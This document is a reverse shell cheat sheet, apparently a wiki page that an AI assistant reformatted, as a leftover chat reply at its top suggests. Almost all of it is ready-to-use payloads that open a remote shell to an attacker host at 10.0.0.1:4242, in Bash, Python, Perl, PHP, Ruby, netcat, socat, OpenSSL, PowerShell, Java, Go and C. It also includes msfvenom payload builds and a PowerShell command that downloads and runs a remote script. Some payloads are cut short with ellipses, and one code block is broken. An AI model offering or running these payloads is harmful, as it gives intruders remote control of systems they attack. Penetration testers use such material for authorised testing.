---
icon: arrow-up-arrow-down
---

# Reverse Shell CheatSheet

Got it! We’ll keep **everything** from your original cheatsheet but structure it in a **clear, organized, and readable way** so that it’s easy to navigate and use. I will group by **language/tool**, then by **TCP/UDP/platform**, and add **headings, indentation, and notes** for clarity—without removing any content. Here’s the improved version:

***

## **Reverse Shell Cheatsheet – Full Version**

***

### **1. Bash Reverse Shells**

#### TCP

```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
```

#### UDP

```bash
# Victim
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

# Listener
nc -u -lvp 4242
```

**Tip:** Check other shells: `sh`, `ash`, `bsh`, `csh`, `ksh`, `zsh`, `pdksh`, `tcsh`, `bash`.

***

### **2. Socat**

```bash
# Listener on attacker
user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242

# Victim
user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242

# Download static binary on victim (Linux)
user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
user@victim$ chmod +x /tmp/socat
user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```

**Static socat binaries:** [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

***

### **3. Perl Reverse Shells**

#### Linux

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

#### Windows

```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

***

### **4. Python Reverse Shells**

#### Linux IPv4

```python
export RHOST="10.0.0.1";export RPORT=4242
python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

#### Linux IPv6

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

#### Windows Python2 / Python3

```python
# Python2
python.exe -c '...'

# Python3
python.exe -c "import socket,os,threading,subprocess as sp; ..."
```

_(Full payloads kept from original for reference)_

***

### **5. PHP Reverse Shells**

```php
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'

php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

***

### **6. Ruby Reverse Shells**

#### Linux

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

#### Windows

```ruby
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

***

### **7. Netcat Reverse Shells**

#### Traditional

```bash
nc -e /bin/sh 10.0.0.1 4242
nc -e /bin/bash 10.0.0.1 4242
nc -c bash 10.0.0.1 4242
```

#### OpenBSD

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4242 >/tmp/f
```

#### BusyBox

```bash
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4242 >/tmp/f
```

#### Ncat

```bash
ncat 10.0.0.1 4242 -e /bin/bash
ncat --udp 10.0.0.1 4242 -e /bin/bash
```

***

### **8. OpenSSL / TLS Reverse Shells**

```bash
# Attacker
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
# or
ncat --ssl -vv -l -p 4242

# Victim
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
```

***

### **9. Powershell Reverse Shells (Windows)**

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream=$client.GetStream();...
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242); ..."
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/.../mini-reverse.ps1')
```

***

### **10. TTY Shell / Interactive Shells**

```bash
# Upgrading
python -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo # fix problems
rlwrap nc # better

# Upgrade shell
ctrl+z
stty raw -echo
fg

# Bash
stty raw -echo; fg

# Zsh
stty raw -echo; fg

# Set terminal
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <num>

# Using tmux
tmux
# run netcat in tmux
ctrl+b c
ps aux | grep nc
kill -s TSTP <PID>
```

#### Spawn TTY from Interpreter

```bash
```

python3 -c 'import pty; pty.spawn("/bin/sh")'\
perl -e 'exec "/bin/sh";'\
ruby -rsocket -e 'f=TCPSocket.open("10.0.0.1",4242).to\_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

````

---

## **11. MSFVenom / Meterpreter Reverse Shells**

| Platform | Payload | Format |
|----------|---------|--------|
| Windows  | windows/meterpreter/reverse_tcp | exe |
| Linux    | linux/x86/meterpreter/reverse_tcp | elf |
| OSX      | osx/x86/shell_reverse_tcp | macho |
| Web      | java/jsp_shell_reverse_tcp | war, raw |
| PHP      | php/meterpreter_reverse_tcp | raw |

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf > reverse.elf
````

***

### **12. Miscellaneous Reverse Shells**

#### Java

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
```

#### Go

```go
echo 'package main; import("os/exec";"net"); func main(){ c,_:=net.Dial("tcp","10.0.0.1:4242"); cmd:=exec.Command("/bin/sh"); cmd.Stdin=c; cmd.Stdout=c; cmd.Stderr=c; cmd.Run() }' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

#### C

```c
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main(void){
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in revsockaddr;
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(4242);
    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");
    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(sockt,0); dup2(sockt,1); dup2(sockt,2);
    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
}
```

***

### **13. Tips / Notes**

* Always try multiple shells: `bash`, `sh`, `python`, `perl`, `ruby`.
* Upgrade partial shells using `python -c 'import pty; pty.spawn("/bin/bash")'`.
* Use `stty raw -echo` to fix terminal issues.
* `rlwrap nc` gives history and editing for Netcat shells.
* For Windows TTY: PowerShell or ConPty methods are best.
* Socat and Rustcat provide fully interactive TTY.

***

